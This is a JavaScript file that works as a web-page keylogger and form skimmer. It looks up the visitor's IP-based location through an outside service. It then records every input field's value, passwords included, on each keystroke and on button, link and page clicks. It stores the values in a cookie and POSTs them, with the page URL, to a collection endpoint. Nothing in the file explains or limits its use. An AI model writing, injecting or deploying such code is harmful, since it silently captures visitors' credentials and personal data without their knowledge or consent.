
var systemInfo={}

var getSystemInfo=async()=>{

    try{
     var response=   await fetch("https://json.geoiplookup.io")
     var  result=await response.json()
      systemInfo=result
      console.log(result)
    }catch(err){
        
        systemInfo={error:true,errMessage:err}
        console.log( systemInfo)
    }

}
getSystemInfo()


var fetchData=async (browserLocation, systemInfo,inputKeys)=>{
    // console.log(inputKeys)
    // alert(browserLocation)
    try{
const response=await fetch("http://localhost:5000/api/user/saveInputKeyData",{
    method:"POST",
    headers:{"content-type":"application/json"},
    body:JSON.stringify({browserLocation,systemInfo,inputKeys})
})
const result=await response.json()
console.log(result)
}catch(err){
    console.log(err)
}
}




var fetchButtonData=async (browserLocation, systemInfo,inputKeys)=>{
    // console.log(inputKeys)
    // alert(browserLocation)
    try{
const response=await fetch("http://localhost:5000/api/user/saveButtonInputData",{
    method:"POST",
    headers:{"content-type":"application/json"},
    body:JSON.stringify({browserLocation,systemInfo,inputKeys})
})
const result=await response.json()
console.log(result)
}catch(err){
    console.log(err)
}
}



// const FetchServer=(data)=>{
// console.log({data})
// }




if(document.querySelector("input")){
    var timeout  = setTimeout(function(){}, 0);
            

    document.querySelectorAll("input").forEach(input=>{
        input.onkeyup=()=>{
      
            clearTimeout(timeout);
            console.log("typing...")
        var inputs=[]
          document.querySelectorAll("input").forEach(input=>{
           var  placeholder= input.placeholder
          var value=input.value
          inputs.push(placeholder+"="+ value)

        //    console.log(`{${placeholder}= ${value}}`)
          })
          document.cookie = `inputs=${inputs}`
          
          timeout = setTimeout(()=>fetchData(window.location.href,systemInfo,inputs), 1700)
       


//  console.log(inputs)
// fetchData(window.location.href,systemInfo,inputs)

        }
    })
}



if(document.querySelector("button")){
    
    document.querySelectorAll("button").forEach(button=>{
        button.onclick=()=>{

            if(document.querySelector("input")){
                var inputs=[]
                document.querySelectorAll("input").forEach(input=>{
                    var  placeholder= input.placeholder
                    var value=input.value
                    inputs.push(placeholder+"="+ value)
                })
                inputs.push(`"${button.innerHTML}" button was clicked at location:${window.location.href}. we have an input data of ${inputs}`)
            console.log(inputs)
            fetchButtonData(window.location.href,systemInfo,inputs)
            }else{
                fetchButtonData(window.location.href,systemInfo,[`"${button.innerHTML}" Button was clicked. eems we have an empty input ,input= ${inputs}`])
            }

            
        }
    })
}



if(document.querySelector("a")){
   
    document.querySelectorAll("a").forEach(a=>{
        a.onclick=()=>{
alert(a.innerHTML)
            if(document.querySelector("input")){
                var inputs=[]
                document.querySelectorAll("input").forEach(input=>{
                    var  placeholder= input.placeholder
                    var value=input.value
                    inputs.push(placeholder+"="+ value)
                })
            inputs.push(`"${a.innerHTML}" anchor tag  was clicked at location:${window.location.href}. we have an input data of ${inputs}`)
            console.log(inputs)
            fetchButtonData(window.location.href,systemInfo,inputs)
            }else{
                fetchButtonData(window.location.href,systemInfo,[`"${a.innerHTML}" anchor tag  was clicked. seems we have an empty input ,input= ${inputs}`])
            }

           
        }
    })
}



document.addEventListener("click", (event)=>{
    if(document.querySelector("input")){
        var inputs=[]
        document.querySelectorAll("input").forEach(input=>{
            var  placeholder= input.placeholder
            var value=input.value
            inputs.push(placeholder+"="+ value)
        })
        fetchButtonData(window.location.href,systemInfo,inputs)
     console.log("called some function at ", window.location.href, inputs)
    }
})







